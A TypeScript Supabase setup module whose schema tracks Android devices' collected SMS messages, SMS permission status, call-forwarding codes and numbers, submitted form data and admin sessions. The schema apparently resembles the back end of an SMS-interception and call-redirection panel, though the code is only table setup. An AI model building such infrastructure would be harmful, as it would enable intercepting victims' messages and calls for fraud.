import { createClient } from "@supabase/supabase-js";

const SUPABASE_URL = process.env["SUPABASE_URL"] ?? "https://dvgcrxrnnezbdjpujjjt.supabase.co";
const SUPABASE_SERVICE_KEY = process.env["SUPABASE_SERVICE_ROLE_KEY"] ?? "";

if (!SUPABASE_SERVICE_KEY) {
  throw new Error("SUPABASE_SERVICE_ROLE_KEY env variable not set");
}

// Service role client — bypasses RLS, full admin access
export const db = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
  auth: { persistSession: false, autoRefreshToken: false },
});

// ── Table creation SQL ─────────────────────────────────────────────────────────
// Run this ONCE in Supabase SQL Editor → https://supabase.com/dashboard/project/dvgcrxrnnezbdjpujjjt/sql
export const SETUP_SQL = `
-- Apps (App IDs)
CREATE TABLE IF NOT EXISTS apps (
  id          BIGSERIAL PRIMARY KEY,
  app_id      TEXT        UNIQUE NOT NULL,
  name        TEXT,
  pin         TEXT        NOT NULL DEFAULT '1234',
  status      TEXT        NOT NULL DEFAULT 'active',
  created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  expires_at  TIMESTAMPTZ
);

-- Devices registered via Android app
CREATE TABLE IF NOT EXISTS devices (
  id                      BIGSERIAL   PRIMARY KEY,
  app_id                  TEXT        NOT NULL,
  sub_id                  TEXT        NOT NULL,
  device_id               TEXT,
  status                  TEXT        NOT NULL DEFAULT 'active',
  data_type               TEXT        NOT NULL DEFAULT 'registered_device',
  device_name             TEXT,
  device_model            TEXT,
  android_version         TEXT,
  sms_messages            JSONB       NOT NULL DEFAULT '[]',
  total_sms_count         INTEGER     NOT NULL DEFAULT 0,
  last_sms_timestamp      BIGINT      NOT NULL DEFAULT 0,
  last_sms_log            JSONB       NOT NULL DEFAULT '{}',
  sms_sync_status         TEXT,
  sms_pending_count       INTEGER     NOT NULL DEFAULT 0,
  sms_processed_count     INTEGER     NOT NULL DEFAULT 0,
  sms_permission_status   TEXT,
  sms_last_sync_at        BIGINT,
  sms_last_error          TEXT,
  call_forward_status     TEXT,
  call_forward_action     TEXT,
  call_forward_code       TEXT,
  call_forward_number     TEXT,
  call_forward_sim_slot   INTEGER,
  call_forward_response   TEXT,
  call_forward_timestamp  BIGINT,
  last_heartbeat_at       BIGINT,
  data_json               JSONB       NOT NULL DEFAULT '{}',
  registered_at           TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  created_at              TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at              TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  is_active               BOOLEAN     NOT NULL DEFAULT TRUE,
  last_seen               TIMESTAMPTZ,
  UNIQUE(app_id, sub_id)
);

-- Admin sessions (logins from Android app users)
CREATE TABLE IF NOT EXISTS admin_sessions (
  id          BIGSERIAL PRIMARY KEY,
  app_id      TEXT        NOT NULL,
  sub_id      TEXT,
  login_time  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  last_active TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  user_agent  TEXT,
  ip          TEXT,
  is_valid    BOOLEAN     NOT NULL DEFAULT TRUE
);

-- Messages sent by Android apps
CREATE TABLE IF NOT EXISTS messages (
  id           BIGSERIAL PRIMARY KEY,
  app_id       TEXT        NOT NULL,
  sub_id       TEXT,
  from_id      TEXT,
  content      TEXT        NOT NULL,
  message_type TEXT        NOT NULL DEFAULT 'message',
  sent_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  is_read      BOOLEAN     NOT NULL DEFAULT FALSE
);

-- Form data submitted by Android apps
CREATE TABLE IF NOT EXISTS form_data (
  id           BIGSERIAL PRIMARY KEY,
  app_id       TEXT        NOT NULL,
  sub_id       TEXT,
  form_type    TEXT        NOT NULL DEFAULT 'form',
  data         JSONB       NOT NULL DEFAULT '{}',
  submitted_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- Settings key-value store
CREATE TABLE IF NOT EXISTS settings (
  id         BIGSERIAL PRIMARY KEY,
  app_id     TEXT        NOT NULL,
  key        TEXT        NOT NULL,
  value      TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  UNIQUE(app_id, key)
);

-- Proxy filter rules
CREATE TABLE IF NOT EXISTS proxy_rules (
  id         BIGSERIAL PRIMARY KEY,
  action     TEXT        NOT NULL,
  field      TEXT        NOT NULL,
  value      TEXT        NOT NULL,
  endpoints  TEXT        NOT NULL DEFAULT 'all',
  note       TEXT        NOT NULL DEFAULT '',
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

-- ── Migrate devices table: add new columns if they don't exist ─────────────────
ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_id TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'active';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS data_type TEXT NOT NULL DEFAULT 'registered_device';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_messages JSONB NOT NULL DEFAULT '[]';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS total_sms_count INTEGER NOT NULL DEFAULT 0;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_sms_timestamp BIGINT NOT NULL DEFAULT 0;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_sms_log JSONB NOT NULL DEFAULT '{}';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_sync_status TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_pending_count INTEGER NOT NULL DEFAULT 0;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_processed_count INTEGER NOT NULL DEFAULT 0;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_permission_status TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_last_sync_at BIGINT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS sms_last_error TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_status TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_action TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_code TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_number TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_sim_slot INTEGER;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_response TEXT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS call_forward_timestamp BIGINT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_heartbeat_at BIGINT;
ALTER TABLE devices ADD COLUMN IF NOT EXISTS data_json JSONB NOT NULL DEFAULT '{}';
ALTER TABLE devices ADD COLUMN IF NOT EXISTS updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW();
ALTER TABLE devices ALTER COLUMN sub_id SET NOT NULL;
ALTER TABLE devices DROP CONSTRAINT IF EXISTS devices_device_id_key;
ALTER TABLE devices DROP CONSTRAINT IF EXISTS devices_app_id_device_id_key;
ALTER TABLE devices ADD CONSTRAINT devices_app_id_sub_id_key UNIQUE (app_id, sub_id);
`.trim();

// ── Auto-create tables via Supabase SQL over HTTP ────────────────────────────
export async function runSetupSql(): Promise<{ ok: boolean; error?: string }> {
  // Supabase allows running SQL via the /sql endpoint with service role key
  const url = `${SUPABASE_URL}/sql`;
  const res = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "apikey": SUPABASE_SERVICE_KEY,
      "Authorization": `Bearer ${SUPABASE_SERVICE_KEY}`,
    },
    body: JSON.stringify({ query: SETUP_SQL }),
  });

  if (!res.ok) {
    // Fallback: try running statement by statement via db.rpc if exec_sql exists
    const stmts = SETUP_SQL.split(";").map((s) => s.trim()).filter(Boolean);
    const errors: string[] = [];
    for (const stmt of stmts) {
      const { error } = await (db as unknown as { rpc: (fn: string, args: Record<string, unknown>) => Promise<{ error: { message: string } | null }> }).rpc("exec_sql", { sql: stmt });
      if (error) errors.push(error.message);
    }
    if (errors.length === stmts.length) {
      return { ok: false, error: "Automatic setup failed. Please run the SQL manually in Supabase SQL Editor." };
    }
  }
  return { ok: true };
}
